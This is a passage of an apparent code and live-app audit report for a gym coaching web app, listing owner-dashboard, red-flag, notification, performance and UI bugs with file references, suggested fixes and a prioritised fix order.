- `getOwnerActivityReport` returns nothing on any error (`lib/data/owner.ts:88`), and the Reports tab then says "Reports are not available yet, run migration 0120". A timeout or temporary fault looks like a missing setup step. The owner Overview shows "Owner access is not set up yet, run migrations 0102 and 0103" on any failure (`app/owner/page.tsx:17`). A network error leaves "Loading reports…" on screen indefinitely.
- "Checked in this week" compares a part-finished week with last week's full figure (a Monday shows a collapse); "Classes attended this month" compares month-to-date with the whole of last month (small print admits it).
- **Confirmed live (owner signed in, 14 Oct):** the Overview says **224 members, 224 "new this month", 125 on a plan, 99 with no plan, 52 plans ended in the last 30 days, 24 ending in 14 days, 114 red-flagged and not contacted**. Reports, on the same project, says "percentages are of the **5** members who have finished onboarding". The real number is about 5; the other 219 are the test accounts (R6). The owner cannot use the Overview for anything until they are removed.
- **Confirmed live:** "Classes attended this month: 144, last month 290, **-50% on last month**" on the 14th. It compares half a month with a whole one, so it will always look bad until month end.
- **Confirmed live:** coaches are listed by login address (`quays@…`, `adam@…`) because they have no display name, every one is labelled "Gym admin" (so the label tells you nothing), and Worsley lists two coaches with 0 members each.
- The weekday averages in Reports ("average of the last 8 complete weeks") include weeks before anyone had logged anything (your table shows zeros from July to mid-September), which pulls every day's average down.
- The owner has no account page (no change password or email; see R37) and the brand name is typed into the screen. The header's Sign out button is hidden below 768 px wide, so a phone user cannot sign out at all (R37); the avatar is not a link.
- Live checks that passed: the gym filter works (Worsley shows "No members to report on yet"); the report function takes 85 to 318 ms; as an owner, every coach page redirects away with no member data in the response, and the three coach APIs return 403 with a clear message. Accessibility on the owner screens: two `<h1>`, no landmarks, and segment buttons 28 to 30 px tall.

### R31. Events

Capacity is checked only inside the sign-up action (count, then insert). The database rule (`0065`) checks only same-gym, so two simultaneous sign-ups both pass, and a member can insert a sign-up directly through the API past capacity or for a past event (same pattern as H2). Editing an event's time or place, or deleting it, tells nobody who signed up; the event simply vanishes. **Fix:** a capacity check in the insert rule or a trigger; a notification on change or delete.

### R32. "Whole gym" client list

`getClientHealthStatuses` is computed only for the signed-in coach's own members. In "Whole gym" a colleague's members therefore show as "Unmonitored" and "Never logged", are excluded from the "Gone quiet" filter and count, and are missing from the CSV, even if they logged today. This is the exact view meant for covering a colleague's holiday. On a colleague's member page "Last active" says "Not monitored".

### R33. Groups and coach notes

- A client group that has ever been used in a broadcast cannot be deleted. `scheduled_communications.target_group_id` is `ON DELETE SET NULL` (`0031`), but the rule added in `0097` requires it to be set when the target is a group; the database refuses. Sent broadcasts have no delete button, so such a group is permanent. Needs a throwaway test to prove (it is a write).
- Goals, injuries and notes on a member (`NotesTab`) are visible only to the coach who wrote them (`client_journal_entries` policy). A colleague covering a member sees none, and injury and limitation notes are stranded when a coach leaves (CH1). There is no edit, only add and delete.

---

## Medium: found later in the audit

### R36. Red flags are filed under the coach's active gym, not the member's gym

- **Confirmed live (read-only database check).** All 224 members belong to Salford Quays and Worsley has none, yet the owner Overview says Worsley has **38 flagged, 38 not contacted** for the week of 5 Oct, and Salford has 76. "All gyms" adds them to **114 flagged**, but only 76 different members are involved: Brad's 38 members are counted in both gyms. Brad works in both gyms and his active gym is currently Worsley.
- **Where:** `red_flag_week_stats` (`supabase/migrations/0098_red_flag_report.sql:126`) picks members with `coach.gym_id = p_gym`, which is the coach's **currently active** gym on their profile, not the gym the member belongs to. Whoever opens the Red Flags tab triggers `generate_red_flag_week` for their own active gym, so the entries are written under it.
- **Effect:** each time a coach who works in two gyms switches gym and opens the tab, their members are filed under that gym too. The weekly list, the owner's counts and the "contacted" tracking depend on which gym the coach happened to have active. This is R28 showing up in real data.
- **Fix:** select members by their own gym (`client_gym_id(c.id) = p_gym`), then delete the duplicate `red_flag_entries` rows where the entry's gym differs from the member's gym.

### R37. The owner login is a read-only dashboard: no member data, no settings, no coach assignment

- **Reported by you from the live app** (you could not see any member data, change settings or a password, or assign coaches while signed in as an owner). I checked it against the code and it matches.
- **What an owner can do today:** look at the Overview (totals per gym, plan mix, red-flag counts, coach table) and the Reports tab. On a screen at least 768 px wide there is also a Sign out button. **On a phone there is no way to sign out** (reported by you; see the next bullet). That is all.
- **No sign-out on a phone:** `AppShell.tsx:80-81` hides the header Sign out button on small screens whenever a page passes a `mobileHeader` (the comment at `:45-46` says those pages put Sign out inside Account instead). The member app and the coach hubs do have an Account or Settings screen with Sign out. The owner page passes a `mobileHeader` but has no Account screen, so below 768 px the owner is signed in with no button anywhere. I confirmed the button is present but hidden at a 574 px window width. Workaround: open it at a wider window or "Request desktop site", or clear the site's cookies. Sign-out also runs only in the browser (`SignOutButton.tsx`), so there is no address that signs a user out. `/owner` is the only owner page (`app/owner/page.tsx`), and every `/coach/**` page and coach API refuses the owner role (confirmed live: redirects, and 403 "Only coaches can add clients" / "Only a gym admin can add coaches").
- **What is missing, by impact:**
  1. **Coaches and members:** no way to add or remove a coach, or to assign or move a member to another coach. (Coach admins cannot either: see CH1.)
  2. **Settings:** gym name, booking rules and who is a gym admin exist only on the coach Settings screen.
  3. **Account:** the change-password and change-email forms are mounted only in coach Settings (`CoachSettingsShell.tsx:105-106`) and the member Account tab (`AccountTab.tsx:170-176`). An owner's only route is "Forgot password" on the login page. There is no two-factor option either (R7).
  4. **Member data:** no member list, no member page, and no link from a number to the people behind it. "99 no plan", "24 plans ending" and "114 flagged" cannot be clicked through.
- **The database does the opposite of the screens.** Migration `0103_owner_foundation.sql` gives the owner read access, through the API, to every profile in their gyms (`:73`) and, via `is_same_gym_as_client()` (`:56-65`), to the same member data a coach in the gym can read: food diary, meal photos, health forms, habits, programmes and the private coach notes (CM7). No screen uses any of it. So the owner login holds broad health-data access that it cannot use in the app and that the privacy policy does not mention (H3), while lacking the controls it needs.
- **Consequence:** every real change has to be made by signing in as a coach admin, so owners end up with a second login (yours is a coach account in Worsley with no members) or share a coach login. The owner can see that 52 plans ended or 114 members are flagged and can do nothing about it.
- **Fix:** decide what an owner is for, then:
  1. An **Account** page: password, email, theme, sign out, two-factor. Quickest fix for the sign-out problem on its own: remove `mobileHeader` from `OwnerShell`, or show Sign out on the owner page at every width.
  2. A read-only **roster** per gym (name, coach, plan, status; no health data), with every Overview number linking to its list.
  3. **Owner actions**, by letting the gym-admin functions accept `is_owner_of_gym(...)` as well as `is_gym_admin`: add coach, assign or reassign members (this needs CH1's `reassign_clients`), make someone a gym admin, rename the gym and set booking rules.
  4. **Narrow the owner read policies** to what those screens use (profiles, memberships, plans, bookings, red flags) and drop access to meal photos, forms and notes unless you want owners to read them.

### R39. Groundwork for a phone app is in the database but unused

- **Where:** `supabase/migrations/0113_push_devices.sql` (a `push_devices` table for phone push tokens and a `register_push_device` function any member can call) and the "phone app" notes in migrations `0108` to `0114`. You have confirmed this project is the web app only, so none of it is used: `lib/push.ts` only sends web push to `push_subscriptions`, nothing reads `push_devices`, and the table has 0 rows. The 2 web subscriptions are Apple Safari ones.
- **Why it still matters:** it is an unused way for a logged-in member to write rows (bounded: 5 per member, token-format check), and the limits added in those migrations apply to the web app too. It is also the reason the earlier reports kept saying "check the phone app before tightening policies".
- **Fix:** leave it if a phone app is planned; otherwise remove the function and table in a later migration. If a phone app is ever built, `sendPushToClient` must also read `push_devices` and send to Expo.

### R40. Coaches are never notified of a member's message

`pushMemberIfFromCoach` (`lib/data/chat.ts:13`) only notifies when the **coach** writes. A member's message produces no push and no email to the coach; the coach has to open the app and look at the badge (Brad already shows 64 unread). Realtime delivery only helps if the coach's screen is open. For real testing, coaches will miss messages. **Fix:** push (and optionally email once R2 is fixed) to the member's coach on a new message, with a quiet-hours rule.

### R41. Push failures are invisible and slow down sending

`lib/push.ts` counts failures but every caller throws the result away (`.catch(() => {})` in `bigDog.ts`, `nutritionFeedback.ts`, birthdays, reminders), and only "subscription gone" (404/410) is acted on. A wrong key, an expired Apple token or a rate limit would fail silently. Sending a chat message also **waits** for every push to every device before it returns (`chat.ts:89`). **Fix:** log failures to Sentry with a count, and send push after responding (or without awaiting).

### R42. The push sender identifies itself with a personal Gmail address

`VAPID_SUBJECT` is not set in Vercel, so `lib/push.ts:11` falls back to `mailto:basfitnz@gmail.com`. Push services (Apple, Google, Mozilla) receive that address with every send. Set it to a business address.

### R43. The sign-in page is heavy

The production sign-in page loads 10 files (1.15 MB of JavaScript and CSS before compression; the biggest four are 441, 242, 152 and 110 KB) for a screen with two boxes. Most of it is shared app code (the database client, Sentry, toast and confirm providers, the service-worker and splash components) loaded on every page. It is fine on Wi-Fi and slower on a gym's weak mobile signal. **Fix:** lazy-load Sentry, the confirm and toast providers and the splash; measure with Lighthouse on a mid-range phone.

### R44. Icons and splash images are re-checked on every launch

Files in `public/` (the logo, the three app icons, 11 iPhone splash images, `manifest.json`) are served `max-age=0, must-revalidate`, so every app launch sends a request for each. There are no iPad splash images, so an iPad install shows a white flash. **Fix:** add long-lived cache headers for `/icons`, `/splash` and `/logo-*.png` in `next.config.ts`, and add the iPad sizes.

### R45. Scheduled jobs are healthy (no action)

All 126 active memberships carry this week's credit reset; the check-in reminder job ran at 04:16 UTC today; red-flag entries, programme rollouts (4 of 4 applied) and notifications are current. On the Hobby plan a job can start any time in the hour after its schedule (04:00 ran at 04:16), so scheduled times are approximate (CM1, R8).

### R46. The reminder job runs for the test accounts

223 members have been sent a check-in reminder, including the 219 seeded test accounts, so every morning the job writes notifications and attempts pushes for test data. It is a good reason to remove them before testing (R6).

---

## Low

The items in the rest of this section were found by reading the code; none were reproduced unless stated.

### R34. Last-admin guard exists only in the screen

`set_gym_admin` (`0056:96`) has no "at least one admin" check; the rule lives in `GymAdminSection.tsx` using local state. Two admins demoting each other at once, or a direct call, leaves a gym nobody can administer without SQL.

### Smaller items: member screens

- Browsing back through days in Food Tracking creates a blank daily log for every day viewed (no look-back limit).
- The Food and Check-in screens keep "today" from when they opened; a phone left open overnight logs new food on yesterday.
- Barcode scan always adds 100 g with no amount prompt; quantity and Quick Add boxes accept negatives and huge values.
- Add-food sheet closes before the save finishes, so a failed add loses what was typed; edit sheet and Add-food sheet have no focus trap or Escape.
- "Add the whole meal plan to today" adds duplicates if tapped twice.
- Measurements: saving an empty form stores an empty row that makes "Now" show dashes; "Now" is the latest row, not the latest value per site.
- Photo upload cannot retry the same file after a failure; signed photo and printout links expire after 10 minutes while the screen stays open.
- Body scan date has no maximum; a mistyped future date becomes "latest".
- Draft answers to health forms stay in browser storage after sign-out (`form-draft:…`).
- A required number question can be submitted without a number.
- Locked lessons still send their text and link to the phone (hidden only on screen); YouTube embeds use the standard domain rather than the no-cookie one.
- The feedback form does not say the member's name goes with it.
- Member "credits" screen shows no history and no expiry dates; bonus credits expire silently.
- "Programme finished" text on the coaching hub uses the oldest programme, not the current one.
- Notification bell marks each notification read with its own request (up to 50).
- Sessions-done counts differ slightly between Home and the rewards function (status filter).
- Event banner formats dates for New Zealand (`en-NZ`); header dates on coach pages are US style.
- Gender is a two-option choice labelled "Gender" (it is used as sex in the calorie formula); wording could say so.
- iPads are not recognised as installable (`useInstall`), so the install banner never shows on a gym tablet.
- Bottom nav and tab rows lack `aria-current`/tab roles; no `<main>` landmark and one heading per screen (scan above); the confirm dialog focuses the destructive button and has no Escape (**confirmed live** on the delete-form dialog: "Delete" was focused when it opened and Escape did not close it).
- Trend chart end-dot stretches on wide screens.

### Smaller items: coach and owner screens

- Coach's Clients "Account deletion request" to-do and filter can never fire now that deletion is immediate (`deleteMyAccount`).
- **Confirmed live:** a member who has never logged anything shows "Never logged" in the Clients list but "Last active 6 days ago" at the top of their own page (`CoachMemberOverview.tsx` shows days since sign-up as "last active").
- **Confirmed live:** the gym roster in Settings shows a coach with no display name twice (the email as the name and again underneath); the Classes day strip lists about 40 days with no month labels ("THU 1" follows "WED 30"); the form editor's red Delete sits next to Back at the top of the screen; the editor is not announced as a dialog.
- Opening the "Add client" popover creates the coach's sign-up link the first time it is shown (`getMyJoinLinkToken` inserts a row), so even looking at it writes.
- A coach with 90 members gets 64 unread conversations listed in the header badge and "Weekly check-ins to review: 141" on the dashboard; both are counts of seeded test activity (R6) and make the To-do list unusable until cleaned.
- 123 of 474 library exercises have no video linked (the library shows "No video (123)").
- Coach dashboard "Happening now" is computed once at load and goes stale on a page left open.
- Creating a client or coach shows a plain-text temporary password with no force-change (CM2); the create route does not roll back the login if the profile insert fails, and does not trim or lower-case the email. The Import dialog's check is "contains an @", so a free-text note cell is treated as an email.
- The TV page (`/coach/run/…/tv`) is a normal signed-in coach page; a gym screen has to stay logged in as a coach, and its Exit goes to the full coach app.
- Viewing the Red Flags tab writes records (weekly entries are generated on first view) and stepping back creates entries for old weeks from today's membership state.
- Package screen: unticking every screen saves "no screens" for that plan; a blank "credits per week" saves 0; delete uses a name-keyed member count in the fallback path.
- Credits tab: holds have no end date and no gym-wide list, so a forgotten hold hides a member from every red-flag list; "Extra session" and pack grants have no confirmation; the amount box snaps back to 1 when cleared.
- Coach reports "% came" divides attended by all bookings (including unmarked and future), while the Overview tab uses marked sessions only; the report refetches the same 30 days on open.
- Programme templates: deleting a week leaves a gap in the week numbers, so members get an empty week; deleting a template silently cancels its queued rollouts.
- Exercise library: CSV import has no duplicate check and does not check link formats; the delete confirm says programmes are unaffected, but the database refuses to delete any exercise a programme uses (raw error shown).
- Education: adding a lesson turns "finished" members back to unfinished; lesson links are not checked to be web addresses (React 19 neutralises `javascript:` links, so not exploitable today).
- Forms: choice options are comma-separated (an option cannot contain a comma); a choice question with no options can be saved and cannot be answered; no reorder or preview.
- Coach settings: display-name save does not refresh the page; the default reminder select does not revert on failure; the gym switcher has no keyboard handling; the gym admin timezone confirm does not say booked sessions will move.
- Each coach page asks for the whole chat overview just to show the unread badge; opening one member runs the full bundle plus the whole roster's statuses.
- Sub-tab choice on the Classes, Library, Business and Messages hubs is not in the address, so reload resets it; every coach page paints blank until the app loads (`ClientOnly`).
- A transient database error on the profile lookup shows "Account setup isn't complete, contact your coach".
- Several places hard-code "Ballistic Performance" (owner header, gym switcher, owner gym names); renaming a gym changes how they display.

---

## Checked and sound in this round

- Member and coach actions that spend money or change membership are server-checked (confirmed again while reading `memberships.ts`, `classes.ts`, `forms.ts`, `communications.ts`).
- Education, programme templates and class timetable edits are done row by row (only forms are replaced wholesale).
- Colleague coach pages really are read-only at the database: the only same-gym write rules are for rewards and Big Dog shirts.
- Owner report functions are `SECURITY DEFINER` with an owner check (no per-row policy cost).
- Event capacity cannot be lowered below the current sign-ups; the Packages screen warns before changing a plan that members are on; the booking-rules form warns before a timezone change; coach credit removal stops at zero.
- The accessibility scan found no unnamed buttons and no images without a description on the five member tabs.

## Please verify (needs your knowledge)

1. Whether any of the 219 `smoke-…@example.com` accounts or Linda's changes should be kept (R6, "What I changed").
2. Whether Resend has a verified sending domain (R2).
3. The Supabase project region and the Vercel plan you intend to run on (R8, R10).
4. Whether anything other than this web app (a script, or any other app) writes directly to `bookings`, `exercise_library`, `event_signups` or `client_profiles` before tightening those rules (H1, H2, R31).
5. Whether coaches should see each other's notes and every member's forms and meal photos (CM7, R33).
6. One member account has **no gym** (`select id, email from profiles where role = 'client' and gym_id is null;`). It is invisible to gym-wide views but still got a red-flag entry on 28 Sept.
7. Whether the second owner account (an `example.com` address created on 10 Oct) is a test account to delete.

## Suggested order

1. **Today, no code:** turn off public sign-up (R1). Switch Brad's active gym to Salford Quays so his screens show his members' plans and classes (R38). Do not edit any form members have filled in (R3). Do not use "Everyone at the gym" when starting a programme (R5). Open one coach conversation at a time (R4). Do not rely on email broadcasts (R2). Delete the "test" event (R35).
2. **This week, settings:** verify a sending domain and set `RESEND_FROM_EMAIL` (R2); remove the test accounts (R6); enable two-factor for staff (R7); add `to authenticated` and indexes on the policies (R9).
3. **One migration** with the H1, H2, CM5 and R9 policy changes and the form fix (R3), and `RESTRICT` on `bookings.class_id` (CH2).
4. **Small code fixes with big payoff:** R38 (member-scoped screens use the member's gym; plan must match the member's gym), R4 (stale reply), R5 (confirm and rollback), R12 (sliders), R11 (calories-only), R24 (one CSV helper), R25 (confirm sends), R27 (history limit), R28 and R36 (gym id on writes and red flags).
5. **Before more members install:** a domain, Pro plan with skew protection, an update banner (R8), the privacy policy (H3), and a decision on hosting region (R10).
6. **Before testers join:** R40 (coach notifications) and R41 (push failures); then work through [PRE_TESTING_CHECKLIST.md](PRE_TESTING_CHECKLIST.md) (dashboard checks and the real-device script).
7. **Decide what an owner is for** (R37), because it shapes the next two pieces of work: an owner Account page and roster first (small), then owner actions built on CH1's remove and reassign functions. Narrow the owner's database read access at the same time.
7. **Then** the rest of the Medium list, and the Low lists as you touch each screen.
